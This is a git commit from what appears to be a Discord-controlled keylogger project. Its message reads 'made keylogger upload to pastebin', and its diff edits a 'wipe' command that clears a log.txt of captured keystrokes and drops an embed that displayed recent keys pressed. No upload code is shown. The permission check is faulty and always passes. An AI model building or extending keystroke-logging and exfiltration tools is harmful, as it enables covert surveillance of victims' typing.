d4030edc43b6ff7e15373e41f0e261f9990b7b7b
Juan <euanwalker2008@gmail.com>
2022-01-25 20:06:18 +0000

    made keylogger upload to pastebin

--- commands/management/wipe.js
+++ commands/management/wipe.js
@@ -3,18 +3,17 @@ module.exports = {
     name: "wipe",
     description: "Wipes log.txt",
     execute(message, client, args, Discord) {
+        const directory = "./log.txt";
+
         if ((message.author.id == "910968511273263104", "418876976963649536")) {
-            fs.writeFileSync("./log.txt", ``);
+            fs.writeFileSync(directory, ``);
         }
+
+        let log = fs.readFileSync(directory);
 
         const wipedembed = new Discord.MessageEmbed()
             .setColor(`RANDOM`)
-            .setTitle(`💻 \`log.txt\' Wiped!`)
-            .addFields({
-                name: "**Recent 18 keys pressed**",
-                value: `\`\`\`${log.slice(0, 250)}\`\`\``,
-                inline: false,
-            })
+            .setTitle(`💻 \`log.txt\` Wiped!`)
             .setTimestamp();
 
         message.channel.send({
